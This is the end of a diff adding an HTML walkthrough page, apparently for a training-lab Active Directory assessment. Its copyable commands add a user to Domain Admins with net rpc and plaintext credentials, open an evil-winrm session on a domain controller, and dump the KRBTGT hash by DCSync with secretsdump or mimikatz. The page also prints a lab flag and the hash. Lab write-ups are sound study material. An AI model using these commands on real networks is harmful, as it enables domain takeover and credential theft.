+$cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\CT059', $secpass)
+Invoke-Command -ComputerName DC01 -Credential $cred -ScriptBlock { net group 'Domain Admins' ct059 /add /domain }</span></div>
+
+    <div class="decision fail"><div class="decision-label">✗ "Access is denied" on DC01</div>CT059 doesn't have WinRM access to DC01. Use net rpc from Parrot instead.</div>
+
+    <div class="decision fail"><div class="decision-label">✗ Can't nest PSSessions in Evil-WinRM</div>Enter-PSSession doesn't work inside another remote session.</div>
+
+    <div class="decision option"><div class="decision-label">Attempt 2 — net rpc from Parrot (works!)</div>
+    <span class="cmd" onclick="copy(this)">net rpc group addmem "Domain Admins" "CT059" -U 'INLANEFREIGHT/CT059%charlie1' -S 172.16.7.3</span>
+    No output = success. Verify:
+    <span class="cmd" onclick="copy(this)">net rpc group members "Domain Admins" -U 'INLANEFREIGHT/CT059%charlie1' -S 172.16.7.3</span></div>
+
+    <div class="step"><span class="step-icon">▸</span><div>Connect to DC01 as CT059 (now Domain Admin)<span class="cmd" onclick="copy(this)">evil-winrm -i 172.16.7.3 -u CT059 -p 'charlie1'</span></div></div>
+    <div class="step"><span class="step-icon">▸</span><div>Read the flag<span class="cmd" onclick="copy(this)">type C:\Users\administrator\Desktop\flag.txt</span></div></div>
+
+    <div class="decision worked"><div class="decision-label">✔ What worked</div>net rpc from Parrot (no Windows shell needed) → Evil-WinRM directly to DC01. Flag: <strong>acLs_f0r_th3_w1n!</strong></div>
+  </div>
+</div>
+
+<div class="arrow-down">↓</div>
+
+<div class="phase p-green" onclick="toggle(this)">
+  <div class="phase-hdr">
+    <div class="phase-num">11</div>
+    <div class="phase-title">DCSync — dump KRBTGT hash</div>
+    <span class="phase-tag tag-flag">Q12</span>
+    <span class="chevron">▶</span>
+  </div>
+  <div class="phase-body">
+    <div class="need"><div class="need-label">What we need</div>The KRBTGT NTLM hash — proves full domain compromise</div>
+
+    <div class="step"><span class="step-icon">▸</span><div>From Parrot, run secretsdump<span class="cmd" onclick="copy(this)">python3 /usr/local/bin/secretsdump.py inlanefreight.local/CT059:charlie1@172.16.7.3</span></div></div>
+    <div class="step"><span class="step-icon">▸</span><div>Find the krbtgt line in output — hash is after the third colon</div></div>
+
+    <div class="decision fail"><div class="decision-label">✗ secretsdump not found</div>Try: <span class="cmd" onclick="copy(this)">python3 /opt/impacket/examples/secretsdump.py inlanefreight.local/CT059:charlie1@172.16.7.3</span></div>
+
+    <div class="decision option"><div class="decision-label">Alternative — mimikatz from DC01</div>Upload mimikatz to DC01 and run: <span class="cmd" onclick="copy(this)">lsadump::dcsync /user:inlanefreight\krbtgt</span></div>
+
+    <div class="decision worked"><div class="decision-label">✔ What worked</div>secretsdump from Parrot → <strong>7eba70412d81c1cd030d72a3e8dbe05f</strong></div>
+  </div>
+</div>
+
+<div id="toast" class="toast">Copied!</div>
+
+<script>
+function toggle(el){el.classList.toggle('open')}
+function copy(el){
+  const t=el.textContent;
+  navigator.clipboard.writeText(t).then(()=>{
+    const toast=document.getElementById('toast');
+    toast.classList.add('show');
+    setTimeout(()=>toast.classList.remove('show'),1200);
+  });
+}
+</script>
+</body>
+</html>
